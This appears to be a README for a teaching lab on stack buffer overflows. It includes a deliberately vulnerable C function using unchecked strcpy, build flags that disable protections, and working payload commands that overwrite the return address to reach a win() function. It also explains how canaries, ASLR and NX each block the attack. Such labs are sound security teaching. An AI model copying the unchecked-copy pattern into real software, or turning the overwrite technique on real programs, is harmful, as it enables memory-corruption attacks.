# 04-buffer-overflow

A deliberately vulnerable C program for studying a stack-based buffer overflow end to end: see the bug, find the offset, hijack control flow, then turn the mitigations back on and watch each one break a different step. **Educational only.**

## The bug

`vuln.c` has a 16-byte buffer and a `strcpy()` with no length check:

```c
void vulnerable(const char *input) {
    char buf[16];
    strcpy(buf, input);   /* copies the whole input, however long it is */
    printf("stored: %s\n", buf);
}
```

There is also a `win()` function that normal execution never calls. The exploit makes the program run it anyway.

## Build it (protections off)

```bash
gcc -std=c99 -g -fno-stack-protector -no-pie 04-buffer-overflow/vuln.c -o /tmp/vuln
```

`-fno-stack-protector` removes the stack canary and `-no-pie` keeps the addresses fixed, so the overflow is visible and `win()` lives at the same place every run.

## Find the offset

The frame looks like this, low address to high:

```
buf[16] | saved rbp (8) | return address (8)
```

So the buffer-to-return-address distance is **24 bytes**. Watch where each input lands:

```bash
/tmp/vuln AAAAAAAAAAAAAAAA            # 16 bytes  -> safe, returns normally
/tmp/vuln $(python3 -c 'print("A"*24)')   # overwrites the saved frame pointer
/tmp/vuln $(python3 -c 'print("A"*32)')   # overwrites the return address -> crash
/tmp/vuln $(python3 -c 'print("A"*40)')   # return address fully controlled
```

Under gdb you can see it directly:

```bash
gdb /tmp/vuln
(gdb) break vulnerable
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
(gdb) x/8gx $rsp        # inspect the frame; the B's land on the return address
(gdb) info frame
```

## Hijack control flow

`main()` prints `win()`'s address. Pad 24 bytes to reach the return address, then overwrite it with that address (little-endian):

```bash
/tmp/vuln $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + (0xADDR).to_bytes(8,"little"))')
```

On `ret`, the CPU pops the address you wrote and jumps to `win()`. That is the whole shape of control-flow hijacking in one input.

## Turn the mitigations back on

Each one defeats a different step of what you just did:

- **Stack canary** (`-fstack-protector-all`) puts a guard value between the buffer and the return address. The overflow changes it, and the check before `ret` aborts the program *before* the overwritten return address is ever used. Detection.
- **ASLR / PIE** (drop `-no-pie`, leave system ASLR on) randomizes addresses every run, so the hardcoded `win()` target stops working — the crash address is different each time. Hiding the target.
- **NX** (non-executable stack, on by default) marks the stack non-executable, so the inject-shellcode-into-the-buffer variant never runs. Blocking injected code.

Real systems stack all three. This demo strips them off precisely so you can see what each one was protecting.
